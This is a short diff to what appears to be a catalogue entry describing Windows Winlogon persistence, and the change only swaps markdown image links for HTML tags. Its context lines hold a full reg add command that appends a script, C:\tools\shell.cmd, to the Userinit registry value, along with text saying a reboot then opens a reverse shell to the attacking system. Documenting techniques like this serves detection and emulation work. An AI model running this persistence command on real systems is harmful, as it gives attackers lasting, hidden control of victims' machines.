@@ -68,16 +68,16 @@ extended_description: |
     ```
     reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
     ```
-    ![Pwsh](23.JPG)
+    <img src="../23.JPG" alt="Pwsh"/>
 
     ## Possible usage
 
     ### Reverse shell
     1) Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:
-    ![Pwsh](24.JPG)
+    <img src="../24.JPG" alt="Pwsh"/>
 
     ## Attack diagram
-    ![Diagram](34.svg)
+    <img src="../34.svg" alt="Diagram"/>
 
     ## References
     [Windows Logon Helper](https://www.ired.team/offensive-security/persistence/windows-logon-helper)
